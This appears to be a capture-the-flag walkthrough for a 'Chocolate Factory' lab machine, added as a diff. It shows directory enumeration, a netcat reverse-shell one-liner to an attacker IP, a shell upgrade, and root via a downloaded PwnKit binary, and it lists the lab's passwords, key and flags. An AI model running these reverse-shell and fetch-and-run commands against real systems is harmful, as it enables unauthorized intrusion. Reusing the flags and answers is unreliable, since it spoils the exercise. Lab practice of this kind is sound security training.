@@ -1,0 +1,156 @@
+
+IP - 10.10.95.76
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+┌──(root㉿kali)-[~]
+└─# dirsearch -u 10.10.95.76 -e php -f -x 400,403
+
+  _|. _ _  _  _  _ _|_    v0.4.2
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 13441
+
+Output File: /root/.dirsearch/reports/10.10.95.76_23-01-03_18-13-14.txt
+
+Error Log: /root/.dirsearch/logs/errors-23-01-03_18-13-14.log
+
+Target: http://10.10.95.76/
+
+[18:13:14] Starting: 
+[18:14:29] 200 -  569B  - /home.php                                         
+[18:14:32] 200 -    1KB - /index.html                                       
+[18:14:32] 200 -  273B  - /index.php.bak                                    
+                                                                             
+Task Completed
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+At home.php we can execute command
+
+Execute reverse shell command
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.17.8.93 4444 >/tmp/f
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+spawn ptty shell
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+export TERM=xterm
+
+Ctrl + Z
+
+stty raw -echo; fg
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+ Enter the key you found! 
+
+ -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
+
+ I found key from:
+
+ www-data@chocolate-factory:/var/www/html$ cat key_rev_key
+
+
+ ---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+What is Charlie's password?
+
+cn7824
+
+
+
+ root@chocolate-factory:/var/www/html# cat validate.php 
+<?php
+        $uname=$_POST['uname'];
+        $password=$_POST['password'];
+        if($uname=="charlie" && $password=="cn7824"){
+                echo "<script>window.location='home.php'</script>";
+        }
+        else{
+                echo "<script>alert('Incorrect Credentials');</script>";
+                echo "<script>window.location='index.html'</script>";
+        }
+
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+I got root with PwnKit exploit.
+
+From My machine:
+
+file transfer with python2 -m SimpleHTTPServer 8888
+
+
+From victim machine:
+
+wget "http://myip:8888/PwnKit"
+
+chmod +x PwnKit
+
+./PwnKit
+
+whoami
+
+root
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+charlie ssh password - 2232
+
+
+ Enter the user flag
+
+ root@chocolate-factory:/home/charlie# cat user.txt
+flag{cd5509042371b34e4826e4838b522d2e}
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+Enter the root flag
+
+root@chocolate-factory:~# python root.py 
+Enter the key:  b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
+__   __               _               _   _                 _____ _          
+\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
+ \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
+  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
+  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
+                                                                             
+  ___                              ___   __  
+ / _ \__      ___ __   ___ _ __   / _ \ / _| 
+| | | \ \ /\ / / '_ \ / _ \ '__| | | | | |_  
+| |_| |\ V  V /| | | |  __/ |    | |_| |  _| 
+ \___/  \_/\_/ |_| |_|\___|_|     \___/|_|   
+                                             
+
+  ____ _                     _       _       
+ / ___| |__   ___   ___ ___ | | __ _| |_ ___ 
+| |   | '_ \ / _ \ / __/ _ \| |/ _` | __/ _ \
+| |___| | | | (_) | (_| (_) | | (_| | ||  __/
+ \____|_| |_|\___/ \___\___/|_|\__,_|\__\___|
+                                             
+ _____          _                    
+|  ___|_ _  ___| |_ ___  _ __ _   _  
+| |_ / _` |/ __| __/ _ \| '__| | | | 
+|  _| (_| | (__| || (_) | |  | |_| | 
+|_|  \__,_|\___|\__\___/|_|   \__, | 
+                              |___/  
+
+flag{cec59161d338fef787fcb4e296b42124}
+
+
+
+
+
